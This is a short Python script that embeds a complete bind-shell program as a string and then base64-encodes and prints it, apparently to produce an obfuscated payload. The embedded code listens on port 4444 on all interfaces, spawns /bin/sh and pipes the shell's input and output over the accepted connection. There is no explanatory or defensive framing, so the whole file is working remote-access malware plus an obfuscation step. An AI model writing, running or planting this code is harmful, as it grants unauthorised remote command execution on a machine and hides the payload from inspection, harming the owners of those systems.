import base64

code = ''' 
import subprocess
import socket
import os
import threading
import time

HOST = '0.0.0.0'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((HOST, PORT))

s.listen(1)
print(f"[*] Listening on {HOST}:{PORT}")

conn, addr = s.accept()
print(f"[*] Connection from: {addr[0]}:{addr[1]}")

proc = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

def read_from_subprocess_and_write_to_socket(proc, conn):
    while True:
        output = proc.stdout.read(1)
        if not output:
            break
        conn.send(output)

def read_from_socket_and_write_to_subprocess(conn, proc):
    while True:
        data = conn.recv(1024)
        if not data:
            break
        proc.stdin.write(data)
        proc.stdin.flush()

threading.Thread(target=read_from_subprocess_and_write_to_socket, args=(proc, conn)).start()
threading.Thread(target=read_from_socket_and_write_to_subprocess, args=(conn, proc)).start()

'''
sample_string_bytes = code.encode("ascii") 
base64_bytes = base64.b64encode(sample_string_bytes)
base64_string = base64_bytes.decode("ascii") 
print(base64_string)
